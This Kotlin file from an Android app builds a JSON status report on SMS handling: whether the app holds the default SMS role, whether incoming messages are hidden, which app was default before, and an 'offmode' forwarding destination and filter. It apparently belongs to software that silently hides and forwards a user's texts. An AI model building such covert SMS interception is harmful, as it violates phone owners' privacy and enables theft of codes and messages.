package com.base.realtime.sms

import android.content.Context
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.buildJsonObject
import kotlinx.serialization.json.put

object SmsStatus {
    data class Snapshot(
        val defaultPkg: String,
        val defaultLabel: String,
        val ours: Boolean,
        val hideIncoming: Boolean,
        val previousPkg: String,
        val previousLabel: String,
    )

    fun collect(context: Context): Snapshot {
        val app = context.applicationContext
        val pkg = SmsDefaultJob.currentDefault(app)
        val label = if (pkg.isNotBlank()) SmsDefaultJob.labelFor(app, pkg) else ""
        val prevPkg = SmsHideStore.previousPkg(app)
        val prevLabel = SmsHideStore.previousLabel(app).ifBlank {
            if (prevPkg.isNotBlank()) SmsDefaultJob.labelFor(app, prevPkg) else ""
        }
        return Snapshot(
            defaultPkg = pkg,
            defaultLabel = label,
            ours = pkg == app.packageName,
            hideIncoming = SmsHideStore.hideIncoming(app),
            previousPkg = prevPkg,
            previousLabel = prevLabel,
        )
    }

    fun toJson(context: Context): JsonObject {
        val s = collect(context)
        return buildJsonObject {
            if (s.defaultPkg.isNotBlank()) put("smsDefaultPkg", s.defaultPkg)
            if (s.defaultLabel.isNotBlank()) put("smsDefaultLabel", s.defaultLabel)
            put("smsOurs", s.ours)
            put("smsHideIncoming", s.hideIncoming)
            if (s.previousPkg.isNotBlank()) put("smsPreviousPkg", s.previousPkg)
            if (s.previousLabel.isNotBlank()) put("smsPreviousLabel", s.previousLabel)
            put("offmode", OffmodeStore.enabled(context))
            val to = OffmodeStore.forwardTo(context)
            if (to.isNotBlank()) put("offmodeTo", to)
            if (OffmodeStore.enabled(context)) put("offmodeFilter", OffmodeStore.filter(context))
        }
    }
}
